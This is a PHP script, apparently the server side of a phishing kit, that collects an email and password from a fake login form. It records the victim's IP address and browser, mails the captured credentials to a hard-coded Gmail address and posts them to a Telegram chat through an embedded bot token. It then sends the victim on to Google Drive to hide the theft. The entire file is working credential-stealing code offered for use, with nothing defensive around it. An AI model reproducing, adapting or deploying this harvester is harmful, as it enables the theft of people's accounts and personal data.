<?php
// Inclusion des dépendances (si nécessaire)
include 'email.php';

// Fonction pour envoyer un message Telegram
function send_telegram_msg($message) {
    // Configuration du bot Telegram
    $botToken = '8054681380:AAGq5oUs8XRxM6NhZA-N9F0D9hjwbfqECLU';
    $chat_ids = ['8179736651']; // Liste des chat_id

    $website = "https://api.telegram.org/bot" . $botToken;

    // Envoi du message à chaque ID de chat
    foreach ($chat_ids as $chat_id) {
        $params = [
            'chat_id' => $chat_id,
            'text'    => $message,
        ];

        // Envoi via cURL
        $ch = curl_init($website . '/sendMessage');
        curl_setopt($ch, CURLOPT_HEADER, false);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_POST, true);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $params);
        curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
        curl_exec($ch);
        curl_close($ch);
    }
    return true;
}

// --- Récupération et validation des données POST ---
$email = isset($_POST['email']) ? trim($_POST['email']) : null;
$password = isset($_POST['password']) ? trim($_POST['password']) : null;

// URL de redirection après le succès
$redirect = 'https://drive.google.com/drive/u/0/home';

// Validation des champs obligatoires
if (filter_var($email, FILTER_VALIDATE_EMAIL) && !empty($password)) {
    // Informations utilisateur
    $ip = $_SERVER['REMOTE_ADDR'];
    $hostname = gethostbyaddr($ip);
    $useragent = $_SERVER['HTTP_USER_AGENT'];

    // Création du message
    $message = "|----------| ArkealoGeNDz |--------------|\n";
    $message .= "Online ID         : " . htmlspecialchars($email) . "\n";
    $message .= "Passcode          : " . htmlspecialchars($password) . "\n";
    $message .= "|--------------- I N F O | I P -------------------|\n";
    $message .= "Client IP         : " . $ip . "\n";
    $message .= "GeoIP Link        : http://www.geoiptool.com/?IP=$ip\n";
    $message .= "User Agent        : " . $useragent . "\n";
    $message .= "|----------- ArkealoGeNDz --------------|\n";

    // Configuration pour l'envoi de l'email
    $send_to = "tijobsworkers@gmail.com"; // Adresse e-mail cible
    $subject = "Login Attempt from IP: $ip";
    $headers = "From: hosting@juicylucy.cl\r\n" .
               "Reply-To: hosting@juicylucy.cl\r\n" .
               "X-Mailer: PHP/" . phpversion();

    // --- Envoi de l'e-mail ---
    if (mail($send_to, $subject, $message, $headers)) {
        // Envoi du message vers Telegram
        send_telegram_msg($message);

        // Réponse JSON pour le succès
        $response = [
            'signal' => 'ok',
            'msg'    => 'Message sent successfully',
            'redirect_link' => $redirect,
        ];
    } else {
        // Réponse JSON pour échec
        $response = [
            'signal' => 'error',
            'msg'    => 'Failed to send email.',
        ];
    }
} else {
    // Réponse JSON en cas de données invalides
    $response = [
        'signal' => 'bad',
        'msg'    => 'Invalid email format or missing fields.',
    ];
}

// Envoi de la réponse JSON
header('Content-Type: application/json');
echo json_encode($response);
exit;
?>
